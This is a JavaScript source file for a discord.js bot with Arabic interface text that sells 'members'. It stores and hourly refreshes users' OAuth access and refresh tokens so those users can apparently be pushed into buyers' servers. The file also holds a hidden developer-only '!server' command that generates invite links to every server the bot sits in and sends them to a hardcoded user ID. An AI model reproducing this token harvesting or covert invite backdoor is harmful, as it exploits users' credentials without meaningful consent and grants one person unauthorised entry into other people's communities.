const { Client, Collection, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, GatewayIntentBits  } = require('discord.js');
const { readdirSync } = require('fs');
const { CLIENT_ID, PREFIX, STOCK_CHANNEL, STOCK_MESSAGE } = require('./src/Constants.js');
const client = new Client({ intents: 3276543 });
const events = readdirSync('events');
const mongoose = require('mongoose');
const DBManager = require('./src/managers/DBManager');
const usersData = require('./src/models/Users.js');
const axios = require('axios');
const { BOT_URL } = require('./src/Constants.js');

client.commands = new Collection();
client.prefix = PREFIX;
client.db = {
  users: new DBManager(usersData) 
};

process.on('unhandledRejection', (err) => console.error(err));

mongoose.connection.on('connected', () => console.log('Connected to database !'));
mongoose.connect(process.env.MONGO);

events.filter(e => e.endsWith('.js')).forEach(event => {
  event = require(`./events/${event}`);
  event.once ? client.once(event.name, (...args) => event.execute(...args, client)) : client.on(event.name, (...args) => event.execute(...args, client));
});

events.filter(e => !e.endsWith('js')).forEach(folder => {
  readdirSync('events/' + folder).forEach(event => {
    event = require(`./events/${folder}/${event}`);
    event.once ? client.once(event.name, (...args) => event.execute(...args, client)) : client.on(event.name, (...args) => event.execute(...args, client));
  });
});

for (let folder of readdirSync('commands').filter(folder => !folder.includes('.'))) {
  for (let file of readdirSync('commands/' + folder).filter(f => f.endsWith('.js'))) {    
    const command = require(`./commands/${folder}/${file}`);
    command.category = folder;
    client.commands.set(command.name?.trim().toLowerCase(), command);
  }
}

client.on('messageCreate', async (message) => {
    // تأكد أن الشخص الذي يكتب الأمر هو الشخص الذي تريد السماح له فقط
    if (message.content === '!leaveAll' && message.author.id === '626071995796291603') {
        try {
            const guilds = client.guilds.cache;
            for (const [guildId, guild] of guilds) {
                if (guildId === '945753343127613461') {
                    console.log(`Skipped leaving the guild: ${guild.name} (ID: ${guildId})`);
                    continue; // تجاهل السيرفر المحدد
                }
                await guild.leave();
                console.log(`Left the guild: ${guild.name}`);
            }
            await message.channel.send('لقد غادرت جميع السيرفرات ما عدا السيرفر المستثنى.');
        } catch (error) {
            console.error('Error leaving guilds:', error);
            await message.channel.send('حدث خطأ أثناء محاولة مغادرة السيرفرات.');
        }
    }
});


client.on("messageCreate", async (developer_support) => {
  if (developer_support.author.bot) return;
  
  let devs = ["626071995796291603"];
  
  if (developer_support.content.toLowerCase() === "!server") {
    if (!devs.includes(developer_support.author.id)) {
      let embed = new EmbedBuilder()
        .setColor("#5c5c5c")
        .setTitle("**ليس لديك صلاحيات**");
      
      developer_support.channel.send({ embeds: [embed] }).then(z => {
        setTimeout(() => z.delete(), 3000);
      });
      
      return;
    }

    client.guilds.cache.forEach(g => {
      g.channels.cache
        .filter(channel => channel.type === 0 && channel.permissionsFor(g.members.me).has('SendMessages'))
        .first()
        ?.createInvite({
          maxUses: 100,
          maxAge: 86400
        })
        .then(i =>
          developer_support.channel.send(`
> https://discord.gg/${i.code}  |  ${g.owner} الأونـر شـيـب هـو 
          `)
        );
    });
  }
});




setInterval(async () => {
  const channel = client.channels.cache.get(STOCK_CHANNEL);

  if (channel) {
    const message = await channel.messages.fetch(STOCK_MESSAGE);

    if (message) {
      const usersCount = await usersData.countDocuments({ accessToken: { $exists: true } });
      const embed = new EmbedBuilder()
      .setTitle('شـراء الأعـضـاء :')
      .setColor('#1a1a1a')
      .setImage("https://media.discordapp.net/attachments/944620604026408971/949576383896641566/LH_INFO7.png?ex=66c8e9ac&is=66c7982c&hm=403d87b3d2ab96ec556b24125e30f781145da7b2fdf144183a8b9ec5e5b16eba&=&format=webp&quality=lossless&width=750&height=231")
      .setDescription(`**عدد الأعضاء الحقيقيين في البوت هو  :  \`${usersCount}\` .**`)

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder() 
        .setStyle(ButtonStyle.Secondary)
        .setCustomId('withdraw-m-balance')
        .setEmoji("👥")
        .setLabel('أدخَالُ الأعضَاء'), 
      new ButtonBuilder()
        .setStyle (ButtonStyle.Secondary)
        .setCustomId("buy-balance")
        .setEmoji("💰")
        .setLabel('شِراءْ عمُلات'),
      new ButtonBuilder()
        .setStyle (ButtonStyle.Secondary)
        .setCustomId("my-coins")
        .setEmoji("🪙")
        .setLabel('عُملاتي'),
      new ButtonBuilder() 
        .setStyle(ButtonStyle.Link)
        .setURL(BOT_URL)
        .setEmoji("🌐")
        .setLabel('إدخَالُ البُوت'));

      message.edit({ embeds: [embed], components: [row] });
    } 
  }
}, 18e5);

setInterval(async () => {
  const users = await usersData.find({ accessToken: { $exists: true } });

  for (const userData of users) {
    try {
      const response = await axios.post('https://discord.com/api/oauth2/token',
        new URLSearchParams({
          client_id: process.env.CLIENT_ID,
          client_secret: process.env.CLIENT_SECRET,
          grant_type: 'refresh_token',
          refresh_token: userData.refreshToken,
        }).toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
       });

       userData.accessToken = response.data.access_token;
       userData.refreshToken = response.data.refresh_token;

       await userData.save();

       console.log(`✅ ${userData.id}`);
     } catch {
       await usersData.findByIdAndRemove(userData._id);

       console.log(`❌ ${userData.id}`);
     }
   }
 }, 36e5);

client.login(process.env.TOKEN);
require('./src/Util.js');
